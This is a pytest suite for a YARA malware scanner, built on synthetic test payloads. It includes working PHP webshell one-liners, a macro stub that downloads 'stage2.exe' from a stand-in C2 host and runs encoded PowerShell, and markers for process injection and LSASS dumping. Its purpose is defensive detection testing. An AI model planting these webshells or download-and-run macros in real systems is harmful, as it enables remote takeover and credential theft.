"""YARA scanner tests.

Inputs are synthetic payloads engineered to trigger each rule in isolation -
no real malware is checked in. Each sample contains only the minimum strings
the rule needs to fire, so regressions in rule conditions surface immediately.
"""

from core.yara.scanner import YaraScanner, get_scanner


# --- Clean-input baseline ------------------------------------------------


def test_clean_text_has_no_matches():
    """Benign prose must never trigger any rule - false-positive guardrail."""
    scanner = get_scanner()
    benign = b"Hello team, please review the quarterly report attached."
    assert scanner.scan(benign) == []


def test_empty_bytes_returns_empty():
    """Empty payloads short-circuit without touching the rule engine."""
    scanner = get_scanner()
    assert scanner.scan(b"") == []


# --- PHP webshells (T1505.003) -------------------------------------------


def test_php_webshell_eval_post_detected():
    scanner = get_scanner()
    payload = b"<?php eval($_POST['cmd']); ?>"

    matches = scanner.scan(payload)
    rule_names = {m["rule"] for m in matches}

    assert "webshell_php_generic" in rule_names


def test_php_webshell_assert_base64_detected():
    scanner = get_scanner()
    # Classic obfuscated webshell pattern: assert() over base64_decode()
    payload = b"<?php assert(base64_decode($_REQUEST['x'])); ?>"

    matches = scanner.scan(payload)
    rule_names = {m["rule"] for m in matches}

    assert "webshell_php_generic" in rule_names


def test_php_c99_hints_detected():
    scanner = get_scanner()
    # Needs <?php + 2 of the c99/r57 marker strings
    payload = b"<?php /* c99shell v1.0 - safe_mode bypass */ echo 'pwned'; ?>"

    matches = scanner.scan(payload)
    rule_names = {m["rule"] for m in matches}

    assert "webshell_php_c99_hints" in rule_names


# --- Ransomware (T1486) --------------------------------------------------


def test_ransom_note_generic_three_phrases():
    """Note with 3 ransom phrases alone should fire the rule."""
    scanner = get_scanner()
    payload = (
        b"ALL YOUR FILES HAVE BEEN ENCRYPTED.\n"
        b"To recover your files you must pay the ransom.\n"
        b"Without the decryption key your data is lost forever."
    )

    matches = scanner.scan(payload)
    rule_names = {m["rule"] for m in matches}

    assert "ransomware_note_generic" in rule_names


def test_ransom_note_with_onion_payment_infra():
    """Only 2 phrases but paired with .onion address - still malicious."""
    scanner = get_scanner()
    payload = (
        b"Your files have been encrypted with military-grade AES-256.\n"
        b"Contact us via Tor Browser at: "
        b"abcdefghijklmnopqrstuvwxyz234567abcdefghijklmnopqrstuvwxyz.onion"
    )

    matches = scanner.scan(payload)
    rule_names = {m["rule"] for m in matches}

    assert "ransomware_note_generic" in rule_names


def test_ransomware_known_extension_detected():
    scanner = get_scanner()
    # A single known extension is enough (filename reference inside log/note)
    payload = b"Files renamed to important.docx.lockbit after infection."

    matches = scanner.scan(payload)
    rule_names = {m["rule"] for m in matches}

    assert "ransomware_known_extensions" in rule_names


# --- Office macro maldocs (T1204.002) ------------------------------------


def test_office_macro_ole2_shell_detected():
    scanner = get_scanner()
    # Synthetic OLE2 container (magic bytes at offset 0) with AutoOpen + Shell
    payload = (
        b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"  # OLE2 magic
        + b"\x00" * 64
        + b"Sub AutoOpen()\n"
        + b"    Shell \"powershell -nop -enc JABhAD0A...\", vbHide\n"
        + b"End Sub"
    )

    matches = scanner.scan(payload)
    rule_names = {m["rule"] for m in matches}

    assert "office_macro_suspicious_execution" in rule_names


def test_office_macro_ooxml_urldownload_detected():
    scanner = get_scanner()
    # OOXML (zip) container with Document_Open + URLDownloadToFile
    payload = (
        b"PK\x03\x04"  # ZIP magic
        + b"\x00" * 32
        + b"Private Sub Document_Open()\n"
        + b"    Call URLDownloadToFile(0, \"http://c2/stage2.exe\", \"a.exe\", 0, 0)\n"
        + b"End Sub"
    )

    matches = scanner.scan(payload)
    rule_names = {m["rule"] for m in matches}

    assert "office_macro_suspicious_execution" in rule_names


# --- PE maldocs (T1055, T1003) -------------------------------------------


def test_pe_process_injection_detected():
    scanner = get_scanner()
    # MZ header + 2 process-injection API names is the full rule condition
    payload = (
        b"MZ"
        + b"\x00" * 128
        + b"VirtualAllocEx\x00"
        + b"WriteProcessMemory\x00"
        + b"CreateRemoteThread\x00"
    )

    matches = scanner.scan(payload)
    rule_names = {m["rule"] for m in matches}

    assert "pe_process_injection_imports" in rule_names


def test_pe_credential_dumping_detected():
    scanner = get_scanner()
    payload = (
        b"MZ"
        + b"\x00" * 128
        + b"LsaOpenPolicy\x00"
        + b"MiniDumpWriteDump\x00"
        + b"lsass.exe\x00"
    )

    matches = scanner.scan(payload)
    rule_names = {m["rule"] for m in matches}

    assert "pe_credential_dumping_imports" in rule_names


def test_pe_rule_requires_mz_header():
    """No MZ magic = not a PE = no PE rule fires, even if API names are present."""
    scanner = get_scanner()
    payload = b"VirtualAllocEx WriteProcessMemory CreateRemoteThread"

    matches = scanner.scan(payload)
    rule_names = {m["rule"] for m in matches}

    assert "pe_process_injection_imports" not in rule_names


# --- Match metadata / shape ----------------------------------------------


def test_match_exposes_metadata_and_tags():
    """API callers rely on severity/mitre/tags to triage - must be present."""
    scanner = get_scanner()
    payload = b"<?php eval($_POST['x']); ?>"

    matches = scanner.scan(payload)
    webshell = next(m for m in matches if m["rule"] == "webshell_php_generic")

    assert "php" in webshell["tags"]
    assert "webshell" in webshell["tags"]
    assert webshell["metadata"].get("severity") == "critical"
    assert webshell["metadata"].get("mitre") == "T1505.003"


def test_get_scanner_returns_singleton():
    """Rule compilation is expensive; get_scanner must memoize across calls."""
    assert get_scanner() is get_scanner()


def test_scanner_can_be_instantiated_directly(tmp_path):
    """Custom rules_dir lets tests/tools load a focused ruleset."""
    rule_file = tmp_path / "custom.yar"
    rule_file.write_text(
        'rule custom_marker { strings: $a = "CANARY_STRING" condition: $a }'
    )

    scanner = YaraScanner(rules_dir=tmp_path)
    matches = scanner.scan(b"payload with CANARY_STRING inside")

    assert any(m["rule"] == "custom_marker" for m in matches)
